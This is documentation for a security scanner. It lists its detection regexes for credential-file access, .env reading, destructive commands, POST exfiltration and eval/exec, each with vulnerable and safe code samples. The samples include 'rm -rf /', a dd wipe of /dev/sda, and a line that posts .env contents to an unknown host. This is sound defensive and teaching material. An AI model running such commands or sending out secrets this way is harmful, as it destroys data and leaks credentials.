# Security Patterns Documentation

This document describes all security patterns detected by the ASF Security Scanner, including examples and remediation strategies.

## 🚨 High Risk Patterns (DANGER)

### 1. Credential File Access

**Pattern**: `~/\.clawdbot/\.env`, `~/\.ssh`, `~/\.aws`

**Risk**: Direct access to credential files can expose sensitive authentication data.

**Example (Vulnerable)**:
```python
# BAD: Direct file access
with open("~/.clawdbot/.env") as f:
    secrets = f.read()
```

**Example (Safe)**:
```python
# GOOD: Use environment variables
api_key = os.environ.get('API_KEY')
```

**Remediation**: 
- Use environment variables
- Implement proper secret management
- Never hardcode credentials

### 2. Environment File Reading

**Pattern**: `read.*\.env`, `open\(["\']\.env`

**Risk**: Reading .env files directly bypasses proper credential management.

**Example (Vulnerable)**:
```python
# BAD: Reading .env file
env_content = open('.env').read()
```

**Example (Safe)**:
```python
# GOOD: Use python-dotenv properly
from dotenv import load_dotenv
load_dotenv()  # Loads into environment
api_key = os.environ.get('API_KEY')
```

### 3. Destructive Commands

**Pattern**: `rm\s+-rf\s+/`, `dd\s+if=/dev/zero`, `mkfs|format`

**Risk**: Can destroy system data or corrupt filesystems.

**Example (Vulnerable)**:
```bash
# EXTREMELY DANGEROUS
rm -rf /
dd if=/dev/zero of=/dev/sda
```

**Remediation**:
- Use targeted deletion
- Implement confirmation prompts
- Use trash/recycle bin instead
- Restrict permissions

## ⚠️ Medium Risk Patterns (WARNING)

### 1. POST Requests

**Pattern**: `curl.*POST|wget.*POST|fetch.*POST`

**Risk**: Could exfiltrate data to external servers.

**Example (Legitimate)**:
```python
# OK: API integration
response = requests.post('https://api.service.com/data', 
                        json={'query': 'value'})
```

**Example (Suspicious)**:
```python
# SUSPICIOUS: Sending credentials
requests.post('http://unknown-site.com', 
              data={'creds': open('.env').read()})
```

**Review Checklist**:
- Is the endpoint trusted?
- What data is being sent?
- Is SSL/TLS used?

### 2. Dynamic Code Execution

**Pattern**: `exec\s*\(|eval\s*\(|system\s*\(`

**Risk**: Can execute arbitrary code, potential for injection attacks.

**Example (Vulnerable)**:
```python
# BAD: User input in exec
user_code = input("Enter code: ")
exec(user_code)  # Dangerous!
```

**Example (Safer)**:
```python
# BETTER: Restricted execution
allowed_names = {'len': len, 'print': print}
code = compile(user_input, '<string>', 'eval')
result = eval(code, {"__builtins__": {}}, allowed_names)
```

### 3. Filesystem Write Operations

**Pattern**: `fs\.write|writeFile`

**Risk**: Could overwrite important files or create malicious content.

**Example (Review Needed)**:
```javascript
// Check: What file? What content?
fs.writeFileSync('/tmp/output.txt', data);
```

### 4. Network Connections

**Pattern**: `net\.connect|http\.request`

**Risk**: Could connect to malicious servers or leak data.

**Review**:
- Destination verification
- Data transmitted
- Authentication used

## ✅ Good Practices (Recognized as Safe)

### 1. Environment Variables

**Pattern**: `process\.env\.[A-Z_]+`, `os\.environ\.get`

**Why It's Good**: Proper way to handle configuration and secrets.

```python
# BEST PRACTICE
api_key = os.environ.get('API_KEY', 'default')
```

### 2. Example Environment Files

**Pattern**: `\.env\.example`

**Why It's Good**: Template files showing structure without real credentials.

```bash
# .env.example
API_KEY=your_api_key_here
DATABASE_URL=postgresql://user:pass@localhost/db
```

## 🧠 Context Analysis

The scanner recognizes these contexts to avoid false positives:

### Security Warnings
When documentation warns against bad practices:
```markdown
# Security Note
Never commit .env files to version control
Don't expose API keys in client code
```

### Example Code
When showing what NOT to do:
```python
"""
Example of insecure practice:
    password = "hardcoded"  # Don't do this!
"""
```

### Comments
Patterns in comments are ignored:
```javascript
// TODO: Remove hardcoded secret
// api_key = "abc123"  // Old code, commented out
```

## 📝 Custom Patterns

To add custom patterns, edit the scanner:

```python
# Add to appropriate risk level
dangerous_patterns = [
    (r'your_pattern_regex', 'Description of the risk'),
    # ...
]
```

### Pattern Writing Guidelines

1. **Be Specific**: Avoid overly broad patterns
2. **Test Thoroughly**: Check for false positives
3. **Document Clearly**: Explain the risk
4. **Provide Examples**: Show vulnerable and safe code
5. **Include Remediation**: How to fix the issue

## 🔍 Testing Patterns

Test new patterns with:

```python
# Test file: test_pattern.py
test_cases = [
    ("api_key = os.environ.get('KEY')", False),  # Should not flag
    ("api_key = open('.env').read()", True),     # Should flag
]
```